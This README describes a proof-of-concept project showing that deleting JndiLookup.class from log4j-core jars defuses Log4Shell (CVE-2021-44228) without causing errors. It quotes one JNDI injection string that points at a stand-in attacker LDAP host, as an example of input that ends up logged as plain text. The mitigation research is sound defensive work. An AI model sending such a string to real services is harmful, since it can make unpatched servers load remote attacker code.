# Log4ShadeMitigationPoC

This is a small concept project with the aim to experiment and understand the Log4Shell vulnerability, known as [CVE-2021-44228](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/).

In particualr, it aims to prove that the mitigation proposed for versions 2.0 - 2.9, namely removing the org/apache/logging/log4j/core/lookup/JndiLookup.class file from the log4j-core-2.\*.jar, is viable, unproblematic and actually preferable for *every* version of log4j-core-2.

What it shows is that if a) the JDNI lookup functionality is triggered, either by an attacker or by normal usage and b) the class file is missing (because an administrator removed it) *everything works*. There's no error whatsoever; one would expect ClassNotFoundException or NoClassDefFoundError, but what actually happens is that the program happily works, writing the requested output (e.g. "${jndi:ldap://bad.guy.domain:389/evilcode}") in the log file without any processing. **Which for the vast majority of software is exactly what we want**.